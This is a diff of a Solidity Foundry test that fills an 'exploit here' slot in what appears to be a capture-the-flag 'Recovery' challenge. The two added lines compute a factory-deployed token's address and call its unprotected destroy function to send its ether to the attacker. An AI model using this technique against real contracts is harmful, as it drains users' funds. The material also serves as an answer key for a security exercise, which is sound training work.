@@ -64,6 +64,8 @@ contract RecoveryTest is Test {
         vm.startPrank(attacker);
 
         // ========== YOUR EXPLOIT HERE ==========
+        address token = vm.computeCreateAddress(address(factory), 1);
+        SimpleToken(payable(token)).destroy(payable(attacker));
         // ========== END EXPLOIT ==========
 
         vm.stopPrank();
